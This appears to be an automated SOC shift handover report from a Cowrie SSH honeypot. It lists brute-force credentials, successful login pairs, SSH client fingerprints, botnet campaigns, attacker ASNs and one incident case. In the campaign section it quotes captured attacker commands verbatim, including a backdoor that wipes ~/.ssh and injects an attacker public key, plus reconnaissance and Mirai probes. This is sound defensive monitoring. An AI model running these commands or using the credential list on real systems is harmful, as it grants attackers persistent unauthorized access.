# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-04 |
| **Generated At** | 2026-08-04T17:53:52Z |
| **Shift Time** | 17:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **404** |
| Confirmed Threats | **372** |
| False Positives Filtered | **32** (7.9%) |
| Unique Attacker IPs | **129** |
| Countries of Origin | **35** |
| High Severity Cases | **278** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **126** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **305** |
| Unique Credential Pairs | **231** |
| Unique Usernames | **88** |
| Unique Passwords | **163** |
| Successful Auth Pairs | **278** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `admin` | 35 |
| `developer` | 15 |
| `user` | 11 |
| `ubuntu` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 12 |
| `12345678` | 11 |
| `P@ssw0rd` | 11 |
| `admin` | 10 |
| `password` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 6 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `ubnt` | `P@ssw0rd` | 5 |
| `root` | `passw0rd` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-08-04T12:55:09 |
| `admin` | `1234` | `195.178.110.228` | 2026-08-04T12:56:34 |
| `bot` | `bot` | `2.57.122.238` | 2026-08-04T12:56:52 |
| `admin` | `12345` | `195.178.110.228` | 2026-08-04T12:58:09 |
| `root` | `konfetina-kis` | `45.156.87.182` | 2026-08-04T12:58:16 |
| `bot` | `123456` | `2.57.122.238` | 2026-08-04T12:58:30 |
| `centos` | `123456` | `65.20.204.41` | 2026-08-04T12:58:56 |
| `admin` | `123456` | `195.178.110.228` | 2026-08-04T12:59:43 |
| `bot` | `12345` | `2.57.122.238` | 2026-08-04T13:00:08 |
| `admin` | `12345678` | `195.178.110.228` | 2026-08-04T13:01:20 |
| `root` | `pass` | `178.178.222.57` | 2026-08-04T13:02:32 |
| `root` | `pass` | `46.201.247.21` | 2026-08-04T13:02:43 |
| `admin` | `123456789` | `195.178.110.228` | 2026-08-04T13:02:51 |
| `admin` | `idezcloud` | `45.156.87.182` | 2026-08-04T13:03:19 |
| `admin` | `Admin123` | `195.178.110.228` | 2026-08-04T13:04:22 |
| `admin` | `Administrator` | `195.178.110.228` | 2026-08-04T13:05:53 |
| `bin` | `worlddomination` | `10.0.0.73` | 2026-08-04T13:06:46 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-08-04T13:07:25 |
| `root` | `passw0rd` | `49.206.201.253` | 2026-08-04T13:08:02 |
| `root` | `passw0rd` | `180.76.52.146` | 2026-08-04T13:08:16 |
| `bin` | `worlddomination` | `220.163.252.244` | 2026-08-04T13:08:27 |
| `admin` | `access` | `195.178.110.228` | 2026-08-04T13:08:55 |
| `admin` | `admin` | `195.178.110.228` | 2026-08-04T13:10:27 |
| `admin` | `admin123` | `195.178.110.228` | 2026-08-04T13:11:56 |
| `admin` | `admin@123` | `195.178.110.228` | 2026-08-04T13:13:28 |
| `ubuntu` | `Microsoft@2025` | `64.89.161.90` | 2026-08-04T13:14:43 |
| `nobody` | `p@ssword` | `10.0.0.73` | 2026-08-04T13:14:48 |
| `admin` | `adminadmin` | `195.178.110.228` | 2026-08-04T13:15:07 |
| `admin` | `letmein` | `195.178.110.228` | 2026-08-04T13:16:46 |
| `root` | `love12` | `45.156.87.192` | 2026-08-04T13:17:54 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-04T13:18:26 |
| `support` | `support` | `10.0.0.73` | 2026-08-04T13:19:54 |
| `admin` | `password` | `195.178.110.228` | 2026-08-04T13:20:11 |
| `admin` | `password1` | `195.178.110.228` | 2026-08-04T13:21:50 |
| `admin` | `admin` | `64.89.161.90` | 2026-08-04T13:23:10 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-08-04T13:23:25 |
| `administrator` | `123456` | `195.178.110.228` | 2026-08-04T13:25:00 |
| `administrator` | `P@ssw0rd` | `195.178.110.228` | 2026-08-04T13:26:40 |
| `proxyuser` | `proxyuser` | `93.152.221.206` | 2026-08-04T13:27:47 |
| `root` | `nuistps@123` | `45.153.34.226` | 2026-08-04T13:28:19 |
| `administrator` | `admin` | `195.178.110.228` | 2026-08-04T13:28:21 |
| `administrator` | `administrator` | `195.178.110.228` | 2026-08-04T13:30:02 |
| `root` | `root1234` | `45.156.87.192` | 2026-08-04T13:30:06 |
| `admin` | `1qaz2wsx` | `45.156.87.192` | 2026-08-04T13:31:40 |
| `administrator` | `password` | `195.178.110.228` | 2026-08-04T13:31:47 |
| `eth-docker` | `eth-docker` | `45.148.10.240` | 2026-08-04T13:32:40 |
| `administrator` | `root` | `195.178.110.228` | 2026-08-04T13:33:25 |
| `ethdocker` | `ethdocker` | `45.148.10.240` | 2026-08-04T13:34:25 |
| `apache` | `1234` | `195.178.110.228` | 2026-08-04T13:34:54 |
| `sol` | `sol` | `45.148.10.240` | 2026-08-04T13:36:05 |
| `apache` | `12345678` | `195.178.110.228` | 2026-08-04T13:36:23 |
| `sol` | `1234` | `45.148.10.240` | 2026-08-04T13:37:40 |
| `root` | `passw0rd` | `218.4.156.254` | 2026-08-04T13:37:46 |
| `apache` | `Apache123` | `195.178.110.228` | 2026-08-04T13:37:49 |
| `root` | `passw0rd` | `115.241.228.34` | 2026-08-04T13:37:55 |
| `root` | `admin` | `93.152.221.210` | 2026-08-04T13:39:13 |
| `sol` | `123` | `45.148.10.240` | 2026-08-04T13:39:15 |
| `apache` | `admin` | `195.178.110.228` | 2026-08-04T13:39:18 |
| `import` | `p@ssword` | `93.152.221.210` | 2026-08-04T13:40:09 |
| `apache` | `apache` | `195.178.110.228` | 2026-08-04T13:40:49 |
| `sol` | `Solana` | `45.148.10.240` | 2026-08-04T13:40:54 |
| `apache` | `apache@123` | `195.178.110.228` | 2026-08-04T13:42:20 |
| `sol` | `solana` | `45.148.10.240` | 2026-08-04T13:42:31 |
| `root` | `root1234` | `220.189.253.198` | 2026-08-04T13:43:06 |
| `root` | `root1234` | `180.94.75.114` | 2026-08-04T13:43:15 |
| `admin` | `1` | `182.75.197.174` | 2026-08-04T13:43:28 |
| `admin` | `1` | `61.143.227.17` | 2026-08-04T13:43:37 |
| `apache` | `password` | `195.178.110.228` | 2026-08-04T13:43:54 |
| `solana` | `solana` | `45.148.10.240` | 2026-08-04T13:44:06 |
| `backup` | `123` | `195.178.110.228` | 2026-08-04T13:45:29 |
| `solv` | `123456` | `45.148.10.240` | 2026-08-04T13:45:45 |
| `backup` | `12345678` | `195.178.110.228` | 2026-08-04T13:47:06 |
| `saas` | `saas` | `185.74.7.77` | 2026-08-04T13:47:13 |
| `345gs5662d34` | `345gs5662d34` | `185.74.7.77` | 2026-08-04T13:47:16 |
| `saas` | `3245gs5662d34` | `185.74.7.77` | 2026-08-04T13:47:17 |
| `sniper` | `sniper` | `45.148.10.240` | 2026-08-04T13:47:28 |
| `root` | `oussama` | `123.253.162.254` | 2026-08-04T13:48:17 |
| `345gs5662d34` | `345gs5662d34` | `123.253.162.254` | 2026-08-04T13:48:21 |
| `root` | `3245gs5662d34` | `123.253.162.254` | 2026-08-04T13:48:23 |
| `backup` | `backup` | `195.178.110.228` | 2026-08-04T13:48:41 |
| `scraper` | `scraper` | `45.148.10.240` | 2026-08-04T13:49:10 |
| `root` | `admin123456` | `10.0.0.73` | 2026-08-04T13:49:40 |
| `backup` | `backup123` | `195.178.110.228` | 2026-08-04T13:50:16 |
| `solv` | `12345678` | `45.148.10.240` | 2026-08-04T13:50:50 |
| `backup` | `password` | `195.178.110.228` | 2026-08-04T13:51:51 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-04T13:52:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-04T13:52:17 |
| `hummingbot` | `hummingbot` | `45.148.10.240` | 2026-08-04T13:52:32 |
| `developer` | `1` | `195.178.110.228` | 2026-08-04T13:53:29 |
| `freqtrade` | `freqtrade` | `45.148.10.240` | 2026-08-04T13:54:13 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-04T13:54:14 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-04T13:54:15 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-04T13:54:17 |
| `developer` | `123` | `195.178.110.228` | 2026-08-04T13:55:05 |
| `root` | `root1234` | `10.0.0.73` | 2026-08-04T13:55:12 |
| `ollama` | `ollama` | `45.148.10.240` | 2026-08-04T13:55:49 |
| `developer` | `1234` | `195.178.110.228` | 2026-08-04T13:56:38 |
| `jito` | `jito` | `45.148.10.240` | 2026-08-04T13:57:26 |
| `developer` | `12345` | `195.178.110.228` | 2026-08-04T13:58:04 |
| `root` | `abcd1234` | `45.156.87.192` | 2026-08-04T13:58:08 |
| `tensorflow` | `tensorflow` | `45.148.10.240` | 2026-08-04T13:59:08 |
| `ubuntu` | `data@123` | `102.220.160.42` | 2026-08-04T13:59:29 |
| `developer` | `123456` | `195.178.110.228` | 2026-08-04T13:59:34 |
| `support` | `support` | `176.53.159.196` | 2026-08-04T14:00:02 |
| `admin` | `1` | `60.18.139.82` | 2026-08-04T14:00:04 |
| `admin` | `1` | `60.249.252.94` | 2026-08-04T14:00:14 |
| `oneadmin` | `opennebula` | `45.148.10.240` | 2026-08-04T14:00:49 |
| `developer` | `1234567` | `195.178.110.228` | 2026-08-04T14:01:07 |
| `root` | `eve` | `45.148.10.240` | 2026-08-04T14:02:27 |
| `developer` | `12345678` | `195.178.110.228` | 2026-08-04T14:02:37 |
| `developer` | `123456789` | `195.178.110.228` | 2026-08-04T14:04:07 |
| `gns3` | `gns3` | `45.148.10.240` | 2026-08-04T14:04:11 |
| `developer` | `1234567890` | `195.178.110.228` | 2026-08-04T14:05:34 |
| `vyos` | `vyos` | `45.148.10.240` | 2026-08-04T14:05:59 |
| `developer` | `abc123` | `195.178.110.228` | 2026-08-04T14:07:02 |
| `tensor` | `tensor` | `45.148.10.240` | 2026-08-04T14:07:42 |
| `developer` | `admin` | `195.178.110.228` | 2026-08-04T14:08:32 |
| `root` | `admin123456` | `200.222.71.218` | 2026-08-04T14:08:45 |
| `user` | `1` | `45.148.10.240` | 2026-08-04T14:09:19 |
| `root` | `rootserver` | `102.220.160.29` | 2026-08-04T14:09:32 |
| `developer` | `dev` | `195.178.110.228` | 2026-08-04T14:10:02 |
| `user` | `123456` | `45.148.10.240` | 2026-08-04T14:11:00 |
| `developer` | `developer` | `195.178.110.228` | 2026-08-04T14:11:32 |
| `root` | `` | `193.233.82.215` | 2026-08-04T14:11:56 |
| `user1` | `user1` | `45.148.10.240` | 2026-08-04T14:12:42 |
| `developer` | `password` | `195.178.110.228` | 2026-08-04T14:13:02 |
| `root` | `attacker##123` | `64.89.161.90` | 2026-08-04T14:13:58 |
| `john` | `john` | `45.148.10.240` | 2026-08-04T14:14:21 |
| `developer` | `qwerty` | `195.178.110.228` | 2026-08-04T14:14:30 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-04T14:15:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-04T14:15:48 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-04T14:15:48 |
| `docker` | `123` | `195.178.110.228` | 2026-08-04T14:15:59 |
| `bonito` | `bonito` | `45.148.10.240` | 2026-08-04T14:16:00 |
| `admin` | `987654321` | `10.0.0.73` | 2026-08-04T14:16:42 |
| `docker` | `123456` | `195.178.110.228` | 2026-08-04T14:17:31 |
| `nemo` | `nemo` | `45.148.10.240` | 2026-08-04T14:17:43 |
| `docker` | `12345678` | `195.178.110.228` | 2026-08-04T14:19:00 |
| `artemis` | `artemis` | `45.148.10.240` | 2026-08-04T14:19:32 |
| `asterisk` | `asterisk` | `45.148.10.240` | 2026-08-04T14:21:15 |
| `grid` | `grid` | `45.148.10.240` | 2026-08-04T14:22:58 |
| `root` | `666666d` | `94.26.106.234` | 2026-08-04T14:24:04 |
| `erp` | `erp` | `45.148.10.240` | 2026-08-04T14:24:42 |
| `akiwifi` | `*.H1k1k0_M0r1` | `10.0.0.73` | 2026-08-04T14:25:00 |
| `erp` | `erp@123` | `45.148.10.240` | 2026-08-04T14:26:23 |
| `frappe` | `frappe@123` | `45.148.10.240` | 2026-08-04T14:28:00 |
| `ftpuser` | `ChangeMe` | `202.51.214.98` | 2026-08-04T14:29:08 |
| `345gs5662d34` | `345gs5662d34` | `202.51.214.98` | 2026-08-04T14:29:12 |
| `ftpuser` | `3245gs5662d34` | `202.51.214.98` | 2026-08-04T14:29:14 |
| `frappe` | `frappe123` | `45.148.10.240` | 2026-08-04T14:29:41 |
| `frappe` | `123456` | `45.148.10.240` | 2026-08-04T14:31:27 |
| `frappe` | `12345678` | `45.148.10.240` | 2026-08-04T14:33:15 |
| `claude` | `claude` | `45.148.10.240` | 2026-08-04T14:35:00 |
| `codex` | `codex` | `45.148.10.240` | 2026-08-04T14:36:47 |
| `gemini` | `gemini` | `45.148.10.240` | 2026-08-04T14:38:32 |
| `ubuntu` | `ubuntu` | `45.148.10.240` | 2026-08-04T14:40:12 |
| `ubuntu` | `ubuntu@123` | `45.148.10.240` | 2026-08-04T14:41:52 |
| `ubuntu` | `qwer1234` | `45.148.10.240` | 2026-08-04T14:43:37 |
| `root` | `password` | `130.12.182.231` | 2026-08-04T14:43:54 |
| `ubuntu` | `1234qwer` | `45.148.10.240` | 2026-08-04T14:45:24 |
| `ubuntu` | `1q2w3e4r` | `45.148.10.240` | 2026-08-04T14:47:09 |
| `user` | `11` | `115.241.228.34` | 2026-08-04T14:48:10 |
| `user` | `11` | `178.178.222.55` | 2026-08-04T14:48:17 |
| `ubuntu` | `p@ssw0rd` | `45.148.10.240` | 2026-08-04T14:48:57 |
| `ubuntu` | `!@#$%^` | `45.148.10.240` | 2026-08-04T14:50:46 |
| `root` | `07041980` | `94.26.106.33` | 2026-08-04T14:51:00 |
| `root` | `test12!` | `107.173.155.92` | 2026-08-04T14:51:30 |
| `345gs5662d34` | `345gs5662d34` | `107.173.155.92` | 2026-08-04T14:51:33 |
| `root` | `3245gs5662d34` | `107.173.155.92` | 2026-08-04T14:51:33 |
| `root` | `z` | `20.102.69.233` | 2026-08-04T14:51:56 |
| `345gs5662d34` | `345gs5662d34` | `20.102.69.233` | 2026-08-04T14:51:58 |
| `root` | `3245gs5662d34` | `20.102.69.233` | 2026-08-04T14:51:58 |
| `root` | `blockchain1!` | `45.148.10.240` | 2026-08-04T14:52:29 |
| `sol-docker` | `sol-docker` | `45.148.10.240` | 2026-08-04T14:54:08 |
| `soldocker` | `soldocker` | `45.148.10.240` | 2026-08-04T14:55:52 |
| `solana` | `postgres` | `45.148.10.240` | 2026-08-04T14:57:37 |
| `postgres` | `solana` | `45.148.10.240` | 2026-08-04T14:59:20 |
| `debian` | `1q2w3e4r` | `10.0.0.73` | 2026-08-04T14:59:46 |
| `root` | `solana1!` | `45.148.10.240` | 2026-08-04T15:01:06 |
| `username` | `password` | `102.220.160.41` | 2026-08-04T15:01:50 |
| `root` | `Solana1!` | `45.148.10.240` | 2026-08-04T15:02:57 |
| `root` | `Solana!` | `45.148.10.240` | 2026-08-04T15:04:43 |
| `ubnt` | `ubnt5` | `10.0.0.73` | 2026-08-04T15:05:29 |
| `root` | `solana1` | `45.148.10.240` | 2026-08-04T15:06:27 |
| `admin` | `1234567890` | `102.220.160.67` | 2026-08-04T15:06:51 |
| `solana` | `solana1!` | `45.148.10.240` | 2026-08-04T15:08:13 |
| `solana` | `Solana1!` | `45.148.10.240` | 2026-08-04T15:09:59 |
| `root` | `2wsx#EDC` | `93.152.221.50` | 2026-08-04T15:10:15 |
| `operator` | `operator123` | `111.171.125.94` | 2026-08-04T15:10:22 |
| `defi` | `defi` | `45.148.10.240` | 2026-08-04T15:11:42 |
| `user1` | `123456` | `45.148.10.240` | 2026-08-04T15:13:27 |
| `user1` | `12345678` | `45.148.10.240` | 2026-08-04T15:15:14 |
| `ftp` | `ftp` | `94.26.106.234` | 2026-08-04T15:16:05 |
| `user2` | `123456` | `45.148.10.240` | 2026-08-04T15:17:02 |
| `user2` | `12345678` | `45.148.10.240` | 2026-08-04T15:18:45 |
| `debian` | `1q2w3e4r` | `218.15.224.102` | 2026-08-04T15:19:05 |
| `debian` | `1q2w3e4r` | `31.173.8.170` | 2026-08-04T15:19:14 |
| `geth` | `geth` | `45.148.10.240` | 2026-08-04T15:20:31 |
| `ethereum` | `ethereum` | `45.148.10.240` | 2026-08-04T15:22:19 |
| `eth` | `eth` | `45.148.10.240` | 2026-08-04T15:24:03 |
| `eth` | `docker` | `45.148.10.240` | 2026-08-04T15:27:35 |
| `ubnt` | `P@ssw0rd` | `107.135.117.245` | 2026-08-04T15:28:35 |
| `operator` | `P@ssw0rd` | `58.226.255.240` | 2026-08-04T15:28:45 |
| `eth` | `test` | `45.148.10.240` | 2026-08-04T15:29:24 |
| `sol` | `test` | `45.148.10.240` | 2026-08-04T15:31:08 |
| `validator` | `validator` | `45.148.10.240` | 2026-08-04T15:34:41 |
| `Support` | `password` | `10.0.0.73` | 2026-08-04T15:34:50 |
| `node` | `node` | `45.148.10.240` | 2026-08-04T15:36:26 |
| `operator` | `operator` | `45.148.10.240` | 2026-08-04T15:38:11 |
| `trader` | `trader` | `45.148.10.240` | 2026-08-04T15:39:59 |
| `ubnt` | `P@ssw0rd` | `10.0.0.73` | 2026-08-04T15:40:32 |
| `trading` | `trading` | `45.148.10.240` | 2026-08-04T15:41:49 |
| `trader` | `trader123` | `45.148.10.240` | 2026-08-04T15:43:34 |
| `telecomadmin` | `admintelecom` | `130.12.182.230` | 2026-08-04T15:44:17 |
| `operator` | `P@ssw0rd` | `130.185.96.113` | 2026-08-04T15:45:16 |
| `trader` | `123456` | `45.148.10.240` | 2026-08-04T15:45:19 |
| `admin` | `admin` | `47.85.8.171` | 2026-08-04T15:46:26 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-04T15:46:26 |
| `trader` | `12345678` | `45.148.10.240` | 2026-08-04T15:47:08 |
| `trading` | `trading@123` | `45.148.10.240` | 2026-08-04T15:48:56 |
| `ftp` | `ftp` | `102.220.160.42` | 2026-08-04T15:49:48 |
| `root` | `root@123` | `45.148.10.240` | 2026-08-04T15:50:40 |
| `shardeum` | `shardeum` | `45.148.10.240` | 2026-08-04T15:52:31 |
| `admin` | `1234567890` | `130.12.182.110` | 2026-08-04T15:54:18 |
| `root` | `admin@123` | `45.148.10.240` | 2026-08-04T15:54:21 |
| `root` | `solana` | `45.148.10.240` | 2026-08-04T15:56:08 |
| `root` | `validator` | `45.148.10.240` | 2026-08-04T15:57:54 |
| `ubnt` | `P@ssw0rd` | `188.168.86.6` | 2026-08-04T15:58:12 |
| `ubnt` | `P@ssw0rd` | `121.202.146.144` | 2026-08-04T15:58:28 |
| `firedancer` | `firedancer` | `45.148.10.240` | 2026-08-04T15:59:44 |
| `admin` | `12345678` | `130.12.182.230` | 2026-08-04T16:01:16 |
| `blockchain` | `blockchain` | `45.148.10.240` | 2026-08-04T16:01:33 |
| `www-data` | `www-data` | `45.148.10.240` | 2026-08-04T16:03:18 |
| `unknown` | `P@ssw0rd` | `65.20.133.56` | 2026-08-04T16:03:28 |
| `admin` | `1q2w3e` | `64.72.74.162` | 2026-08-04T16:03:40 |
| `user` | `1qq2w3e4r5t` | `45.148.10.240` | 2026-08-04T16:05:05 |
| `user` | `11q2w3e4r5t` | `45.148.10.240` | 2026-08-04T16:06:55 |
| `root` | `1qq2w3e4r5t` | `45.148.10.240` | 2026-08-04T16:08:42 |
| `elround` | `elround` | `45.148.10.240` | 2026-08-04T16:10:27 |
| `elrond` | `elrond` | `45.148.10.240` | 2026-08-04T16:12:19 |
| `admin` | `admin1` | `45.148.10.240` | 2026-08-04T16:14:13 |
| `root` | `root1` | `45.148.10.240` | 2026-08-04T16:16:02 |
| `user` | `user1` | `45.148.10.240` | 2026-08-04T16:17:55 |
| `admin` | `1q2w3e` | `65.20.131.63` | 2026-08-04T16:20:20 |
| `CONNECT 64.89.162.146:80 HTTP/1.0` | `Host: 64.89.162.146:80` | `64.89.162.146` | 2026-08-04T16:20:35 |
| `miner` | `mmpOS` | `45.148.10.240` | 2026-08-04T16:21:38 |
| `root` | `admin` | `45.148.10.240` | 2026-08-04T16:23:26 |
| `git` | `git` | `45.148.10.240` | 2026-08-04T16:25:19 |
| `user` | `123456789123456789` | `101.13.1.58` | 2026-08-04T16:28:28 |
| `user` | `123456789123456789` | `218.15.224.102` | 2026-08-04T16:28:43 |
| `user` | `123456789123456789` | `45.236.19.9` | 2026-08-04T16:28:52 |
| `admin` | `blockchain1!` | `45.148.10.240` | 2026-08-04T16:29:00 |
| `ubuntu` | `blockchain1!` | `45.148.10.240` | 2026-08-04T16:30:54 |
| `operator` | `operator` | `64.89.162.146` | 2026-08-04T16:31:00 |
| `root` | `hachiro123` | `102.220.160.42` | 2026-08-04T16:31:17 |
| `ari` | `ari` | `45.148.10.240` | 2026-08-04T16:32:49 |
| `root` | `raikkonen` | `130.12.182.224` | 2026-08-04T16:32:51 |
| `unknown` | `P@ssw0rd` | `178.178.222.53` | 2026-08-04T16:33:03 |
| `ftpuser` | `test1234` | `43.165.170.198` | 2026-08-04T16:33:36 |
| `345gs5662d34` | `345gs5662d34` | `43.165.170.198` | 2026-08-04T16:33:39 |
| `ftpuser` | `3245gs5662d34` | `43.165.170.198` | 2026-08-04T16:33:40 |
| `sedu` | `sedu` | `45.148.10.240` | 2026-08-04T16:34:38 |
| `solana123` | `solana123` | `45.148.10.240` | 2026-08-04T16:36:26 |
| `USERID` | `PASSW0RD` | `10.0.0.73` | 2026-08-04T16:37:03 |
| `sol123` | `sol123` | `45.148.10.240` | 2026-08-04T16:38:18 |
| `USERID` | `PASSW0RD` | `117.216.33.31` | 2026-08-04T16:38:44 |
| `sol` | `sol123` | `45.148.10.240` | 2026-08-04T16:40:08 |
| `binance` | `binance` | `45.148.10.240` | 2026-08-04T16:43:52 |
| `support` | `1962` | `10.0.0.73` | 2026-08-04T16:44:22 |
| `okx` | `okx` | `45.148.10.240` | 2026-08-04T16:45:49 |
| `montes` | `montes` | `102.220.160.47` | 2026-08-04T16:46:35 |
| `bot` | `bot` | `45.148.10.240` | 2026-08-04T16:47:40 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-04T16:48:39 |
| `telegram` | `telegram` | `45.148.10.240` | 2026-08-04T16:49:31 |
| `raspberry` | `raspberry` | `10.0.0.73` | 2026-08-04T16:50:31 |
| `root` | `admin` | `94.26.106.253` | 2026-08-04T16:50:43 |
| `firedancer` | `firedancer1!` | `45.148.10.240` | 2026-08-04T16:53:14 |
| `root` | `firedancer` | `45.148.10.240` | 2026-08-04T16:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **404** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 180 |
| libssh | 65 |
| OpenSSH | 43 |
| Paramiko (Python) | 14 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 120 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 54 | 1 |
| `a591c4ddccc9...` | Mirai/variant | 33 | 21 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 31 |
| `f555226df196...` | Mirai/variant | 18 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 120 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 54 | 1 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 33 | 21 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 33 | 31 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 4 | — |
| `a984ff804585...` | OpenSSH | 10 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 54 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `193.233.82.215`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.165.170.198`, `185.74.7.77`, `20.102.69.233`, `202.51.214.98`, `107.173.155.92`, `123.253.162.254`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **129** |
| Unique ASNs | **80** |
| High-Risk ASNs | **59** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS197769` | VPS Dedicated LLC | 10 | HIGH |
| `AS197170` | TechTies Inc. | 9 | HIGH |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS25159` | PJSC MegaFon | 5 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (277)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ebdba6ea2ae9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:55 |
| **Last Seen** | 2026-08-04 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:55:08` | `cowrie.session.connect` |
| `2026-08-04 12:55:08` | `cowrie.client.version` |
| `2026-08-04 12:55:08` | `cowrie.client.kex` |
| `2026-08-04 12:55:09` | `cowrie.login.success` |
| `2026-08-04 12:55:10` | `cowrie.session.params` |
| `2026-08-04 12:55:10` | `cowrie.command.input` |
| `2026-08-04 12:55:10` | `cowrie.log.closed` |
| `2026-08-04 12:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
